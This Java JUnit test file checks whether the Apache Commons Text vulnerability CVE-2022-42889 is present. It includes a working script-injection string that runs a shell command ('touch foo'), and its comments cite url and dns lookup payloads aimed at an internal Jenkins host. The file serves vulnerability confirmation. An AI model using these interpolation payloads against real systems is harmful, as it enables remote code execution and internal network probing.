


import org.apache.commons.text.StringSubstitutor;
import org.apache.commons.text.lookup.StringLookup;
import org.apache.commons.text.lookup.StringLookupFactory;
import org.junit.jupiter.api.*;
import org.junit.jupiter.api.condition.EnabledForJreRange;
import org.junit.jupiter.api.condition.EnabledOnOs;
import org.junit.jupiter.api.condition.JRE;
import org.junit.jupiter.api.condition.OS;
import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Test case to verify interpolations.
 * @author jens dietrich
 */
public class ConfirmVulnerabilitiesTests {

    private static Map<String,StringLookup> lookupMap = null;

    @BeforeAll
    public static void extractLookupMap() throws Exception {
        StringLookup interpolatorLookup = StringLookupFactory.INSTANCE.interpolatorStringLookup();
        // interpolation string lookup is not public, use reflection to get to map
        Method mapAccess = interpolatorLookup.getClass().getMethod("getStringLookupMap");
        mapAccess.setAccessible(true);
        lookupMap = (Map<String,StringLookup>)mapAccess.invoke(interpolatorLookup);
    }

    @BeforeEach
    public void clearGeneratedFile() {
        File file = new File("foo");
        if (file.exists()) {
            Assumptions.assumeTrue(file.delete());
        }
    }

    @AfterAll
    public static void releaseLookupMap() {
        lookupMap = null;
    }

    @Test
    @EnabledOnOs({OS.MAC,OS.LINUX})  // cmd is unix
    @EnabledForJreRange(min= JRE.JAVA_8,max=JRE.JAVA_14) // nashorn is removed from JDK 15 onwards
    public void confirmCVE202242889 () throws Exception {

        // try actual script injection
        Path generatedFile = Path.of("foo");
        Assumptions.assumeFalse(Files.exists(generatedFile));

        runExploit("${script:javascript:java.lang.Runtime.getRuntime().exec('touch foo')}");

        Thread.sleep(1000);  // wait for external (async)  process to create the file
        assertTrue(Files.exists(generatedFile));
    }

    @Test
    @EnabledOnOs({OS.MAC,OS.LINUX})  // cmd is unix
    @EnabledForJreRange(min= JRE.JAVA_8,max=JRE.JAVA_14) // nashorn is removed from JDK 15 onwards
    public void confirmCVE202242889ScriptLookupEnabled () throws Exception {

        // the following lookup is needed to enable the vulnerability, and are disabled by default from commons-text:1.10.0
        // https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html
        assertTrue(lookupMap.containsKey("script"));
    }

    @Test
    public void confirmCVE202242889URLLookupEnabled () throws Exception {

        // the following lookup is needed to enable the vulnerability, and are disabled by default from commons-text:1.10.0
        // https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html
        assertTrue(lookupMap.containsKey("url"));

        // could refine test by running the following exploit (https://github.com/SeanWrightSec/CVE-2022-42889-PoC):
        // ${url:UTF-8::https://internal-jenkins.companyx.net/}
        // could make analysis flaky due to network dependency !
    }

    @Test
    public void confirmCVE202242889DNSLookupEnabled () throws Exception {

        // the following lookup is needed to enable the vulnerability, and are disabled by default from commons-text:1.10.0
        // https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html
        assertTrue(lookupMap.containsKey("dns"));

        // could refine test by running the following exploit (https://github.com/SeanWrightSec/CVE-2022-42889-PoC):
        // ${dns:address|internal-jenkins.companyx.net}
        // could make analysis flaky due to network dependency !

    }

    private void runExploit(String exploit) throws Exception  {
        StringSubstitutor substitutor = StringSubstitutor.createInterpolator();
        substitutor.replace(exploit);
    }


}
